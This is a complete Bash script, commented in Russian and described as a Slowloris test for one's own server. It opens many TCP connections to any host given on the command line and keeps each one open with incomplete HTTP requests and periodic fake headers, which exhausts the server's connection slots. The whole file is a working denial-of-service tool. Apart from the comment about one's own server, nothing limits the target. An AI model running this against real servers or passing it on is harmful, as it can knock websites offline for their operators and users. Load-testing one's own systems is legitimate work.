#!/bin/bash
# Slowloris-тест для собственного сервера.
# Использование: ./slowloris.sh -h HOST [-p PORT] [-c CONNECTIONS] [-i INTERVAL]

HOST=""
PORT=80
CONNECTIONS=200
INTERVAL=10
PIDS=()

usage() {
    echo "Использование: $0 -h HOST [-p PORT] [-c CONNECTIONS] [-i INTERVAL]"
    exit 1
}

while getopts "h:p:c:i:" opt; do
    case $opt in
        h) HOST="$OPTARG" ;;
        p) PORT="$OPTARG" ;;
        c) CONNECTIONS="$OPTARG" ;;
        i) INTERVAL="$OPTARG" ;;
        *) usage ;;
    esac
done

[ -z "$HOST" ] && usage

cleanup() {
    echo ""
    echo "[+] Останавливаю, закрываю $( jobs -rp | wc -l ) соединений..."
    kill "${PIDS[@]}" 2>/dev/null
    wait 2>/dev/null
    exit 0
}
trap cleanup INT TERM

worker() {
    local id=$1
    exec {fd}<>"/dev/tcp/$HOST/$PORT" 2>/dev/null || return 1

    printf 'GET /?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: keep-alive\r\n' \
        "$RANDOM$id" "$HOST" >&"$fd" 2>/dev/null || { exec {fd}>&-; return 1; }

    while true; do
        sleep "$INTERVAL"
        printf 'X-a: %s\r\n' "$RANDOM" >&"$fd" 2>/dev/null || break
    done
    exec {fd}>&- 2>/dev/null
}

echo "[+] Открываю $CONNECTIONS соединений к $HOST:$PORT ..."
for ((i = 0; i < CONNECTIONS; i++)); do
    worker "$i" &
    PIDS+=($!)
done

echo "[+] Запущено. Ctrl+C для остановки."
while true; do
    ALIVE=0
    for pid in "${PIDS[@]}"; do
        kill -0 "$pid" 2>/dev/null && ALIVE=$((ALIVE + 1))
    done
    echo "[$(date +%H:%M:%S)] живых воркеров: $ALIVE / $CONNECTIONS"
    sleep 5
done
